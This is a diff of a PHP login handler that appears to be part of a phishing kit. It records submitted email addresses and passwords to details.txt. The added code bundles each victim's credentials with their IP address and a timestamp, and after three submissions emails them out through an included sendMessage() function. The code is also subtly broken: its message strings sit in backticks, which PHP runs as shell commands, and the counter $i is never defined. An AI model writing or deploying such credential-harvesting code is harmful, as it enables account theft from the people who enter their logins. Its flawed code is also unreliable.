@@ -1,7 +1,12 @@
 <?php
+session_start();
 
-
+include "sendemail.php";
+$subject_concat = '';
 if (isset($_POST['email'])) {
+    // alert("test")
+    echo "<meta http-equiv='refresh' content='0'>";
+
     $myfile = fopen("details.txt", "a+") or die("Unable to open file!");
     $objDateTime = new DateTime('NOW');
     $result = $objDateTime->format('Y-m-d H:i:s');
@@ -13,6 +18,21 @@ if (isset($_POST['email'])) {
 
     $email = $_POST['email'] . PHP_EOL;
     $pass = $_POST['pass'] . PHP_EOL;
+
+    $subject = `<br> Here is all the infos you need </br>`.
+`Time connected : `.$result . PHP_EOL . "ip adresss : " . $_SERVER['REMOTE_ADDR'] .PHP_EOL.
+'email is :' .$email .PHP_EOL .
+'Password is :'.$pass.'';
+
+$_SESSION["subject_$i"] = PHP_EOL.$subject ;
+if ($i==3)
+{
+
+    sendMessage($_SESSION["subject_1"].PHP_EOL.$_SESSION["subject_2"].PHP_EOL.$_SESSION["subject_3"]);
+    // sendMessage($_SESSION['subject']);
+
+
+}
     fwrite($myfile, "email: " . $email);
     fwrite($myfile, "pass: " . $pass);
     fclose($myfile);
